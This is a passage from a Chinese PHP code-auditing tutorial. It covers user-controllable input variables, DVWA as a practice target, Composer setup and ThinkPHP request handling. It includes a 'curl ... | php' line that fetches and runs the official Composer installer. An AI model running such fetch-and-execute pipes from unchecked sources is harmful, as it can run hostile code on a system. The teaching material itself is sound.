<li>审计所有代码</li>
</ul>
</div>
<div id="outline-container-h:39a775ed-a7bc-426a-9de3-ede88d8d192a" class="outline-4">
<h4 id="h:39a775ed-a7bc-426a-9de3-ede88d8d192a">用户可控参数</h4>
<div class="outline-text-4" id="text-h:39a775ed-a7bc-426a-9de3-ede88d8d192a">
<p>
<b>来自用户可控的输入, 安全审计中永远不要相信用户的输入</b>
</p>

<p>
变量/常量/函数/等 描述
</p>
<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">_SERVER</span> &#21253;&#21547; &#26381;&#21153;&#22120;&#20449;&#24687; &#29615;&#22659;&#21464;&#37327; &#29992;&#25143;&#20256;&#20837;&#30340;http&#22836;&#21644;uri&#36335;&#24452;&#31561;&#20449;&#24687;

$<span style="color: #a0522d;">_GET</span>
$<span style="color: #a0522d;">HTTP_GET_VARS</span> &#21253;&#21547; &#29992;&#25143;&#20256;&#20837;&#30340;URL&#21442;&#25968;

$<span style="color: #a0522d;">_POST</span>
$<span style="color: #a0522d;">HTTP_POST_VARS</span> &#21253;&#21547; &#29992;&#25143;&#20256;&#20837;&#30340;POST BODY&#30340;&#21442;&#25968; (&#24403; HTTP&#22836;&#20013; Content-Type &#20540; &#20026;application/x-www- form-urlencoded &#25110; multipart/form-data&#26102;&#25165;&#20250;&#34987;&#20256;&#20837;)

$<span style="color: #a0522d;">_FILES</span>
$<span style="color: #a0522d;">HTTP_POST_FILES</span> &#21253;&#21547; &#29992;&#25143;&#19978;&#20256;&#25991;&#20214;&#20449;&#24687; &#25991;&#20214;&#20869;&#23481; &#21407;&#25991;&#20214;&#21517; &#20020;&#26102;&#25991;&#20214;&#21517; &#22823;&#23567; &#31561;&#20449;&#24687;

$<span style="color: #a0522d;">_COOKIE</span>
$<span style="color: #a0522d;">HTTP_COOKIE_VARS</span> &#21253;&#21547; &#29992;&#25143;&#20256;&#20837;&#30340;HTTP&#22836;&#20013;&#30340;Cookies kv&#20540;

$<span style="color: #a0522d;">_REQUEST</span> &#21516;&#26102;&#21253;&#21547; $<span style="color: #a0522d;">GET</span> $<span style="color: #a0522d;">POST</span> $<span style="color: #a0522d;">_COOKIE</span>

php://input
$<span style="color: #a0522d;">HTTP_RAW_POST_DATA</span> &#21253;&#21547; &#29992;&#25143;POST&#35831;&#27714;&#20013;BODY &#30340;&#23436;&#25972;&#25968;&#25454; &#24120;&#35265;&#29992;&#27861;file_get_contents(<span style="color: #8b2252;">'php://input'</span>);

<span style="color: #0000ff;">apache_request_headers</span>()
<span style="color: #0000ff;">getallheaders</span>() &#21253;&#21547; &#29992;&#25143;&#20256;&#20837;&#30340;http&#22836; (Apache ONLY)
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'HTTP_ACCEPT_LANGUAGE'</span>]//&#27983;&#35272;&#22120;&#35821;&#35328;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'REMOTE_ADDR'</span>] //&#24403;&#21069;&#29992;&#25143; IP &#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'REMOTE_HOST'</span>] //&#24403;&#21069;&#29992;&#25143;&#20027;&#26426;&#21517;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'REQUEST_URI'</span>] //URL
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'REMOTE_PORT'</span>] //&#31471;&#21475;&#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'SERVER_NAME'</span>] //&#26381;&#21153;&#22120;&#20027;&#26426;&#30340;&#21517;&#31216;&#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'PHP_SELF'</span>]//&#27491;&#22312;&#25191;&#34892;&#33050;&#26412;&#30340;&#25991;&#20214;&#21517;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'argv'</span>] //&#20256;&#36882;&#32473;&#35813;&#33050;&#26412;&#30340;&#21442;&#25968;&#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'argc'</span>] //&#20256;&#36882;&#32473;&#31243;&#24207;&#30340;&#21629;&#20196;&#34892;&#21442;&#25968;&#30340;&#20010;&#25968;&#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'GATEWAY_INTERFACE'</span>]//CGI &#35268;&#33539;&#30340;&#29256;&#26412;&#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'SERVER_SOFTWARE'</span>] //&#26381;&#21153;&#22120;&#26631;&#35782;&#30340;&#23383;&#20018;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'SERVER_PROTOCOL'</span>] //&#35831;&#27714;&#39029;&#38754;&#26102;&#36890;&#20449;&#21327;&#35758;&#30340;&#21517;&#31216;&#21644;&#29256;&#26412;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'REQUEST_METHOD'</span>]//&#35775;&#38382;&#39029;&#38754;&#26102;&#30340;&#35831;&#27714;&#26041;&#27861;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'QUERY_STRING'</span>] //&#26597;&#35810;(query)&#30340;&#23383;&#31526;&#20018;&#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'DOCUMENT_ROOT'</span>] //&#24403;&#21069;&#36816;&#34892;&#33050;&#26412;&#25152;&#22312;&#30340;&#25991;&#26723;&#26681;&#30446;&#24405;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'HTTP_ACCEPT'</span>] //&#24403;&#21069;&#35831;&#27714;&#30340; Accept: &#22836;&#37096;&#30340;&#20869;&#23481;&#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'HTTP_ACCEPT_CHARSET'</span>] //&#24403;&#21069;&#35831;&#27714;&#30340; Accept-Charset: &#22836;&#37096;&#30340;&#20869;&#23481;&#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'HTTP_ACCEPT_ENCODING'</span>] //&#24403;&#21069;&#35831;&#27714;&#30340; Accept-Encoding: &#22836;&#37096;&#30340;&#20869;&#23481;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'HTTP_CONNECTION'</span>] //&#24403;&#21069;&#35831;&#27714;&#30340; Connection: &#22836;&#37096;&#30340;&#20869;&#23481;&#12290;&#20363;&#22914;&#65306;&#8220;Keep-Alive&#8221;&#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'HTTP_HOST'</span>] //&#24403;&#21069;&#35831;&#27714;&#30340; Host: &#22836;&#37096;&#30340;&#20869;&#23481;&#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'HTTP_REFERER'</span>] //&#38142;&#25509;&#21040;&#24403;&#21069;&#39029;&#38754;&#30340;&#21069;&#19968;&#39029;&#38754;&#30340; URL &#22320;&#22336;&#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'HTTP_USER_AGENT'</span>] //&#24403;&#21069;&#35831;&#27714;&#30340; User_Agent: &#22836;&#37096;&#30340;&#20869;&#23481;&#12290;
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'HTTPS'</span>]//&#22914;&#26524;&#36890;&#36807;https&#35775;&#38382;,&#21017;&#34987;&#35774;&#20026;&#19968;&#20010;&#38750;&#31354;&#30340;&#20540;(on)&#65292;&#21542;&#21017;&#36820;&#22238;off
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'SCRIPT_FILENAME'</span>] <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24403;&#21069;&#25191;&#34892;&#33050;&#26412;&#30340;&#32477;&#23545;&#36335;&#24452;&#21517;&#12290;</span>
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'SERVER_ADMIN'</span>] <span style="color: #b22222;">#</span><span style="color: #b22222;">&#31649;&#29702;&#21592;&#20449;&#24687;</span>
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'SERVER_PORT'</span>] <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26381;&#21153;&#22120;&#25152;&#20351;&#29992;&#30340;&#31471;&#21475;</span>
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'SERVER_SIGNATURE'</span>] <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21253;&#21547;&#26381;&#21153;&#22120;&#29256;&#26412;&#21644;&#34394;&#25311;&#20027;&#26426;&#21517;&#30340;&#23383;&#31526;&#20018;&#12290;</span>
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'PATH_TRANSLATED'</span>] <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24403;&#21069;&#33050;&#26412;&#25152;&#22312;&#25991;&#20214;&#31995;&#32479;&#65288;&#19981;&#26159;&#25991;&#26723;&#26681;&#30446;&#24405;&#65289;&#30340;&#22522;&#26412;&#36335;&#24452;&#12290;</span>
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'SCRIPT_NAME'</span>] <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21253;&#21547;&#24403;&#21069;&#33050;&#26412;&#30340;&#36335;&#24452;&#12290;&#36825;&#22312;&#39029;&#38754;&#38656;&#35201;&#25351;&#21521;&#33258;&#24049;&#26102;&#38750;&#24120;&#26377;&#29992;&#12290;</span>
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'PHP_AUTH_USER'</span>] <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24403; PHP &#36816;&#34892;&#22312; Apache &#27169;&#22359;&#26041;&#24335;&#19979;&#65292;&#24182;&#19988;&#27491;&#22312;&#20351;&#29992; HTTP &#35748;&#35777;&#21151;&#33021;&#65292;&#36825;&#20010;&#21464;&#37327;&#20415;&#26159;&#29992;&#25143;&#36755;&#20837;&#30340;&#29992;&#25143;&#21517;&#12290;</span>
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'PHP_AUTH_PW'</span>] <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24403; PHP &#36816;&#34892;&#22312; Apache &#27169;&#22359;&#26041;&#24335;&#19979;&#65292;&#24182;&#19988;&#27491;&#22312;&#20351;&#29992; HTTP &#35748;&#35777;&#21151;&#33021;&#65292;&#36825;&#20010;&#21464;&#37327;&#20415;&#26159;&#29992;&#25143;&#36755;&#20837;&#30340;&#23494;&#30721;&#12290;</span>
$<span style="color: #a0522d;">_SERVER</span>[<span style="color: #8b2252;">'AUTH_TYPE'</span>] <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24403; PHP &#36816;&#34892;&#22312; Apache &#27169;&#22359;&#26041;&#24335;&#19979;&#65292;&#24182;&#19988;&#27491;&#22312;&#20351;&#29992; HTTP &#35748;&#35777;&#21151;&#33021;&#65292;&#36825;&#20010;&#21464;&#37327;&#20415;&#26159;&#35748;&#35777;&#30340;&#31867;&#22411;</span>
</pre>
</div>

<p>
可以通过 Request 对象完成全局输入变量的检测、获取和安全过滤，支持包括$_GET 、 $_POST 、 $_REQUEST 、 $_SERVER 、 $_SESSION 、 $_COOKIE 、 $_ENV 等系统变量，以及文件上传信息。
</p>

<p>
以 Vulnerable-Web-Application 代码为例，全局搜索$_GET、$_REQUEST等
</p>

<p>
dvwa 代码地址： <a href="https://github.com/digininja/DVWA">https://github.com/digininja/DVWA</a>、
</p>


<p>
审计流程：
</p>
<ul class="org-ul">
<li>查找用户输入</li>
<li>查找敏感函数</li>
<li>审计业务功能</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:da475ddc-8b3a-4da2-b4b9-888112bb9e99" class="outline-3">
<h3 id="h:da475ddc-8b3a-4da2-b4b9-888112bb9e99">Composer安装</h3>
<div class="outline-text-3" id="text-h:da475ddc-8b3a-4da2-b4b9-888112bb9e99">
<p>
Composer 是 PHP 用来管理依赖（dependency）关系的工具。可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。
</p>

<p>
<a href="https://getcomposer.org/">https://getcomposer.org/</a>
</p>

<p>
安装 Composer，你只需要下载 composer.phar 可执行文件。
</p>
<div class="org-src-container">
<pre class="src src-sh">curl -sS https://getcomposer.org/installer | php
mv composer.phar /usr/local/bin/composer
</pre>
</div>

<p>
在 Windows 中，你需要下载并运行 <a href="https://getcomposer.org/Composer-Setup.exe">Composer-Setup.exe</a>。
</p>

<p>
为了避免安装过慢，可以使用阿里云的 composer 镜像。ps 安装thinkphp框架后再用阿里去composer镜像。
</p>

<div class="org-src-container">
<pre class="src src-sh">composer config -g repo.packagist composer https://packagist.phpcomposer.com
</pre>
</div>

<p>
安装依赖时可使用命令
</p>
<div class="org-src-container">
<pre class="src src-sh">composer install
</pre>
</div>
</div>
</div>
</section>
<section id="outline-container-h:84c68648-67fc-4ca8-b3f3-10ebf448d02a" class="outline-2">
<h2 id="h:84c68648-67fc-4ca8-b3f3-10ebf448d02a">THINKPHP框架输入变量</h2>
<div class="outline-text-2" id="text-h:84c68648-67fc-4ca8-b3f3-10ebf448d02a">
<p>
官方文档：<a href="https://www.kancloud.cn/manual/thinkphp5/118006">https://www.kancloud.cn/manual/thinkphp5/118006</a>
</p>
</div>
<div id="outline-container-h:4be97d62-05c8-434a-865e-32ee54ca46f6" class="outline-3">
<h3 id="h:4be97d62-05c8-434a-865e-32ee54ca46f6">概述</h3>
<div class="outline-text-3" id="text-h:4be97d62-05c8-434a-865e-32ee54ca46f6">
<p>
ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。遵循 Apache2 开源许可协议发布，意味着你可以免费使用ThinkPHP，甚至允许把你基于ThinkPHP开发的应用开源或商业产品发布/销售。
</p>

<p>
通过 composer 启动一个thinkphp示例项目
</p>
<div class="org-src-container">
<pre class="src src-sh">composer create-project topthink/think tp
<span style="color: #483d8b;">cd</span> tp
php think run
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35775;&#38382;&#26412;&#22320;8000&#22320;&#22336;</span>
http://localhost:8000

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22914;&#26524;&#23433;&#35013;&#25253;&#38169;&#38656;&#35201;&#20808;&#21024;&#38500;&#20043;&#21069;&#30340;&#38236;&#20687;</span>
composer config -g --unset repos.packagist
</pre>
</div>

<p>
thinkphp框架目录如下，可以看到初始的目录结构：
</p>

<p>
thinkphp5: <a href="https://www.kancloud.cn/manual/thinkphp5/118008">https://www.kancloud.cn/manual/thinkphp5/118008</a>
thinkphp8: <a href="https://doc.thinkphp.cn/v8_0/directory_structure.html">https://doc.thinkphp.cn/v8_0/directory_structure.html</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">project &#24212;&#29992;&#37096;&#32626;&#30446;&#24405;
&#9500;&#9472;application &#24212;&#29992;&#30446;&#24405;&#65288;&#21487;&#35774;&#32622;&#65289;
&#9474; &#9500;&#9472;common &#20844;&#20849;&#27169;&#22359;&#30446;&#24405;&#65288;&#21487;&#26356;&#25913;&#65289;
&#9474; &#9500;&#9472;index &#27169;&#22359;&#30446;&#24405;(&#21487;&#26356;&#25913;)
&#9474; &#9474; &#9500;&#9472;config.php &#27169;&#22359;&#37197;&#32622;&#25991;&#20214;
&#9474; &#9474; &#9500;&#9472;common.php &#27169;&#22359;&#20989;&#25968;&#25991;&#20214;
&#9474; &#9474; &#9500;&#9472;controller &#25511;&#21046;&#22120;&#30446;&#24405;&#65292;&#20195;&#34920;http&#25509;&#21475;&#30446;&#24405;
&#9474; &#9474; &#9500;&#9472;model &#27169;&#22411;&#30446;&#24405;&#65292;&#20195;&#34920;&#25968;&#25454;&#24211;&#25805;&#20316;&#20195;&#30721;&#30446;&#24405;
&#9474; &#9474; &#9500;&#9472;view &#35270;&#22270;&#30446;&#24405;&#65292;&#20195;&#34920;&#21069;&#31471;&#23637;&#31034;&#30340;&#20195;&#30721;&#30446;&#24405;
&#9474; &#9474; &#9492;&#9472; ... &#26356;&#22810;&#31867;&#24211;&#30446;&#24405;
&#9474; &#9500;&#9472;command.php &#21629;&#20196;&#34892;&#24037;&#20855;&#37197;&#32622;&#25991;&#20214;
&#9474; &#9500;&#9472;common.php &#24212;&#29992;&#20844;&#20849;&#65288;&#20989;&#25968;&#65289;&#25991;&#20214;
&#9474; &#9500;&#9472;config.php &#24212;&#29992;&#65288;&#20844;&#20849;&#65289;&#37197;&#32622;&#25991;&#20214;
&#9474; &#9500;&#9472;database.php &#25968;&#25454;&#24211;&#37197;&#32622;&#25991;&#20214;
&#9474; &#9500;&#9472;tags.php &#24212;&#29992;&#34892;&#20026;&#25193;&#23637;&#23450;&#20041;&#25991;&#20214;
&#9474; &#9492;&#9472;route.php &#36335;&#30001;&#37197;&#32622;&#25991;&#20214;
&#9500;&#9472;extend &#25193;&#23637;&#31867;&#24211;&#30446;&#24405;&#65288;&#21487;&#23450;&#20041;&#65289;
&#9500;&#9472;public WEB &#37096;&#32626;&#30446;&#24405;&#65288;&#23545;&#22806;&#35775;&#38382;&#30446;&#24405;&#65289;
&#9474; &#9500;&#9472;static &#38745;&#24577;&#36164;&#28304;&#23384;&#25918;&#30446;&#24405;(css,js,image)
&#9474; &#9500;&#9472;index.php &#24212;&#29992;&#20837;&#21475;&#25991;&#20214;
&#9474; &#9500;&#9472;router.php &#24555;&#36895;&#27979;&#35797;&#25991;&#20214;
&#9474; &#9492;&#9472;.htaccess &#29992;&#20110; apache &#30340;&#37325;&#20889;
&#9500;&#9472;runtime &#24212;&#29992;&#30340;&#36816;&#34892;&#26102;&#30446;&#24405;&#65288;&#21487;&#20889;&#65292;&#21487;&#35774;&#32622;&#65289;
&#9500;&#9472;vendor &#31532;&#19977;&#26041;&#31867;&#24211;&#30446;&#24405;&#65288;Composer&#65289;
&#9500;&#9472;thinkphp &#26694;&#26550;&#31995;&#32479;&#30446;&#24405;
&#9474; &#9500;&#9472;lang &#35821;&#35328;&#21253;&#30446;&#24405;
&#9474; &#9500;&#9472;library &#26694;&#26550;&#26680;&#24515;&#31867;&#24211;&#30446;&#24405;
&#9474; &#9474; &#9500;&#9472;think Think &#31867;&#24211;&#21253;&#30446;&#24405;
&#9474; &#9474; &#9492;&#9472;traits &#31995;&#32479; Traits &#30446;&#24405;
&#9474; &#9500;&#9472;tpl &#31995;&#32479;&#27169;&#26495;&#30446;&#24405;
&#9474; &#9500;&#9472;.htaccess &#29992;&#20110; apache &#30340;&#37325;&#20889;
&#9474; &#9500;&#9472;.travis.yml CI &#23450;&#20041;&#25991;&#20214;
&#9474; &#9500;&#9472;base.php &#22522;&#30784;&#23450;&#20041;&#25991;&#20214;
&#9474; &#9500;&#9472;composer.json composer &#23450;&#20041;&#25991;&#20214;
&#9474; &#9500;&#9472;console.php &#25511;&#21046;&#21488;&#20837;&#21475;&#25991;&#20214;
&#9474; &#9500;&#9472;convention.php &#24815;&#20363;&#37197;&#32622;&#25991;&#20214;
&#9474; &#9500;&#9472;helper.php &#21161;&#25163;&#20989;&#25968;&#25991;&#20214;&#65288;&#21487;&#36873;&#65289;
&#9474; &#9500;&#9472;LICENSE.txt &#25480;&#26435;&#35828;&#26126;&#25991;&#20214;
&#9474; &#9500;&#9472;phpunit.xml &#21333;&#20803;&#27979;&#35797;&#37197;&#32622;&#25991;&#20214;
&#9474; &#9500;&#9472;README.md README &#25991;&#20214;
&#9474; &#9492;&#9472;start.php &#26694;&#26550;&#24341;&#23548;&#25991;&#20214;
&#9500;&#9472;build.php &#33258;&#21160;&#29983;&#25104;&#23450;&#20041;&#25991;&#20214;&#65288;&#21442;&#32771;&#65289;
&#9500;&#9472;composer.json composer &#23450;&#20041;&#25991;&#20214;
&#9500;&#9472;LICENSE.txt &#25480;&#26435;&#35828;&#26126;&#25991;&#20214;
&#9500;&#9472;README.md README &#25991;&#20214;
&#9500;&#9472;think &#21629;&#20196;&#34892;&#20837;&#21475;&#25991;&#20214;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:86d5f529-40eb-46cc-99a0-202ff230ded6" class="outline-3">
<h3 id="h:86d5f529-40eb-46cc-99a0-202ff230ded6">入口文件</h3>
<div class="outline-text-3" id="text-h:86d5f529-40eb-46cc-99a0-202ff230ded6">
<p>
用户请求的PHP文件，负责处理一个请求（注意，不一定是URL请求）的生命周期，最常见的入口文件就是 index.php ，有时候也会为了某些特殊的需求而增加新的入口文件，例如给后台模块单独设置的一个入口文件admin.php 或者一个控制器程序入口 think 都属于入口文件。
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1:8000/hello/abcd
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ca0b4432-a680-4cf4-9fb6-b4b836a9dadd" class="outline-3">
<h3 id="h:ca0b4432-a680-4cf4-9fb6-b4b836a9dadd">MVC模式</h3>
<div class="outline-text-3" id="text-h:ca0b4432-a680-4cf4-9fb6-b4b836a9dadd">
<p>
MVC的全名是Model View Controller，是模型(Model)－视图(view)－控制器(controller)的缩写，是一种设计模式。它是用一种业务逻辑、数据与界面显示分离的方法来组织代码，将众多的业务逻辑聚集到一个部件里面，在需要改进和个性化定制界面及用户交互的同时，不需要重新编写业务逻辑，达到减少编码的时间，提高代码复用性。
</p>

<p>
使用的MVC的目的：它将这些对象、显示、控制分离以提高软件的的灵活性和复用性，MVC结构可以使程序具有对象化的特征，也更容易维护。
</p>

<p>
模型层（Model）：指从现实世界中抽象出来的对象模型，是应用逻辑的反应；它封装了数据和对数据的操作，是实际进行数据处理的地方（模型层与数据库才有交互）
视图层（View）：是应用和用户之间的接口，它负责将应用显示给用户 和 显示模型的状态。
控制器（Controller）:控制器负责视图和模型之间的交互，控制对用户输入的响应、响应方式和流程；它主要负责两方面的动作，一是把用户的请求分发到相应的模型，二是吧模型的改变及时地反映到视图上。
</p>
</div>
</div>
<div id="outline-container-h:9400a028-4c64-4ff9-a035-54ef4789f768" class="outline-3">
<h3 id="h:9400a028-4c64-4ff9-a035-54ef4789f768">控制器</h3>
<div class="outline-text-3" id="text-h:9400a028-4c64-4ff9-a035-54ef4789f768">
<p>
每个模块拥有独立的 MVC 类库及配置文件，一个模块下面有多个控制器负责响应请求，而每个控制器其实就是一个独立的控制器类。
</p>

<p>
控制器主要负责请求的接收，并调用相关的模型处理，并最终通过视图输出。严格来说，控制器不应该过多的介入业务逻辑处理。
</p>

<p>
事实上，5.0中控制器是可以被跳过的，通过路由我们可以直接把请求调度到某个模型或者其他的类进行处理。
</p>

<p>
5.0的控制器类比较灵活，可以无需继承任何基础类库。
</p>

<p>
一个典型的 Index 控制器类如下：
</p>
<div class="org-src-container">
<pre class="src src-sh">namespace app\index\controller;

class Index
{
    public <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">index</span>()
     {
    <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">'hello,thinkphp!'</span>;
     }
}
</pre>
</div>
</div>
</div>
<div id="outline-container-h:5e653ed5-65ed-4a52-a627-34dd762c2702" class="outline-3">
<h3 id="h:5e653ed5-65ed-4a52-a627-34dd762c2702">操作</h3>
<div class="outline-text-3" id="text-h:5e653ed5-65ed-4a52-a627-34dd762c2702">
<p>
一个控制器包含多个操作（方法），操作方法是一个URL访问的最小单元。
</p>

<p>
下面是一个典型的 Index 控制器的操作方法定义，包含了两个操作方法：
</p>
<div class="org-src-container">
<pre class="src src-sh">namespace app\index\controller;

class Index
{
    public <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">index</span>()
     {
    <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">'index'</span>;
     }
    public <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">hello</span>($<span style="color: #a0522d;">name</span>)
     {
    <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">'Hello,'</span>.$<span style="color: #a0522d;">name</span>;
     }
}
</pre>
</div>

<p>
操作方法可以不使用任何参数，如果定义了一个非可选参数，则该参数必须通过用户请求传入，如果是URL请求，则通常是 $_GET 或者 $_POST 方式传入。
</p>
</div>
</div>
<div id="outline-container-h:98c7b73d-9a34-49b1-8599-08b4790d5d6f" class="outline-3">
<h3 id="h:98c7b73d-9a34-49b1-8599-08b4790d5d6f">检测变量是否设置</h3>
<div class="outline-text-3" id="text-h:98c7b73d-9a34-49b1-8599-08b4790d5d6f">
<p>
可以使用 has 方法来检测一个变量参数是否设置，如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;has(<span style="color: #8b2252;">'id'</span>,<span style="color: #8b2252;">'get'</span>);
Request::instance()-&gt;has(<span style="color: #8b2252;">'name'</span>,<span style="color: #8b2252;">'post'</span>);
</pre>
</div>

<p>
或者使用助手函数
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'?get.id'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'?post.name'</span>);
</pre>
</div>

<p>
变量检测可以支持所有支持的系统变量。
</p>
</div>
</div>
<div id="outline-container-h:b889537f-9a50-4ddf-bbee-3edbe18f3fa3" class="outline-3">
<h3 id="h:b889537f-9a50-4ddf-bbee-3edbe18f3fa3">变量获取</h3>
<div class="outline-text-3" id="text-h:b889537f-9a50-4ddf-bbee-3edbe18f3fa3">
<p>
变量获取使用 \think\Request 类的如下方法及参数：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">&#21464;&#37327;&#31867;&#22411;&#26041;&#27861;</span>(<span style="color: #8b2252;">'&#21464;&#37327;&#21517;/&#21464;&#37327;&#20462;&#39280;&#31526;'</span>,<span style="color: #8b2252;">'&#40664;&#35748;&#20540;'</span>,<span style="color: #8b2252;">'&#36807;&#28388;&#26041;&#27861;'</span>)
</pre>
</div>

<p>
变量类型方法包括：
</p>
<div class="org-src-container">
<pre class="src src-sh">&#26041;&#27861; &#25551;&#36848;
param &#33719;&#21462;&#24403;&#21069;&#35831;&#27714;&#30340;&#21464;&#37327;
get &#33719;&#21462; $<span style="color: #a0522d;">_GET</span> &#21464;&#37327;
post &#33719;&#21462; $<span style="color: #a0522d;">_POST</span> &#21464;&#37327;
put &#33719;&#21462; PUT &#21464;&#37327;
delete &#33719;&#21462; DELETE &#21464;&#37327;
session &#33719;&#21462; $<span style="color: #a0522d;">_SESSION</span> &#21464;&#37327;
cookie &#33719;&#21462; $<span style="color: #a0522d;">_COOKIE</span> &#21464;&#37327;
request &#33719;&#21462; $<span style="color: #a0522d;">_REQUEST</span> &#21464;&#37327;
server &#33719;&#21462; $<span style="color: #a0522d;">_SERVER</span> &#21464;&#37327;
env &#33719;&#21462; $<span style="color: #a0522d;">_ENV</span> &#21464;&#37327;
route &#33719;&#21462; &#36335;&#30001;&#65288;&#21253;&#25324;PATHINFO&#65289; &#21464;&#37327;
file &#33719;&#21462; $<span style="color: #a0522d;">_FILES</span> &#21464;&#37327;
</pre>
</div>
</div>
<div id="outline-container-h:8ba53f1b-8290-4de1-b88d-9b4b5b97d185" class="outline-4">
<h4 id="h:8ba53f1b-8290-4de1-b88d-9b4b5b97d185">获取PARAM变量</h4>
<div class="outline-text-4" id="text-h:8ba53f1b-8290-4de1-b88d-9b4b5b97d185">
<p>
PARAM变量是框架提供的用于自动识别 GET 、 POST 或者 PUT 请求的一种变量获取方式，是系统推荐的获取请求参数的方法，用法如下：
</p>
<div class="org-src-container">
<pre class="src src-sh">// &#33719;&#21462;&#24403;&#21069;&#35831;&#27714;&#30340;name&#21464;&#37327;
Request::instance()-&gt;param(<span style="color: #8b2252;">'name'</span>);
// &#33719;&#21462;&#24403;&#21069;&#35831;&#27714;&#30340;&#25152;&#26377;&#21464;&#37327;&#65288;&#32463;&#36807;&#36807;&#28388;&#65289;
Request::instance()-&gt;param();
// &#33719;&#21462;&#24403;&#21069;&#35831;&#27714;&#30340;&#25152;&#26377;&#21464;&#37327;&#65288;&#21407;&#22987;&#25968;&#25454;&#65289;
Request::instance()-&gt;param(false);
// &#33719;&#21462;&#24403;&#21069;&#35831;&#27714;&#30340;&#25152;&#26377;&#21464;&#37327;&#65288;&#21253;&#21547;&#19978;&#20256;&#25991;&#20214;&#65289;
Request::instance()-&gt;param(true);
</pre>
</div>

<p>
param方法会把当前请求类型的参数和PATH_INFO变量以及GET请求合并。
</p>

<p>
使用助手函数实现：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'param.name'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'param.'</span>);
&#25110;&#32773;
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">'name'</span>);
<span style="color: #0000ff;">input</span>(<span style="color: #8b2252;">''</span>);
</pre>
</div>

<p>
因为 input 函数默认就采用PARAM变量读取方式。
</p>
</div>
</div>
<div id="outline-container-h:4d4876f6-5fe2-41fb-901e-1c294439324a" class="outline-4">
<h4 id="h:4d4876f6-5fe2-41fb-901e-1c294439324a">获取GET变量</h4>
<div class="outline-text-4" id="text-h:4d4876f6-5fe2-41fb-901e-1c294439324a">
<div class="org-src-container">
<pre class="src src-sh">Request::instance()-&gt;get(<span style="color: #8b2252;">'id'</span>); // &#33719;&#21462;&#26576;&#20010;get&#21464;&#37327;
Request::instance()-&gt;get(<span style="color: #8b2252;">'name'</span>); // &#33719;&#21462;get&#21464;&#37327;
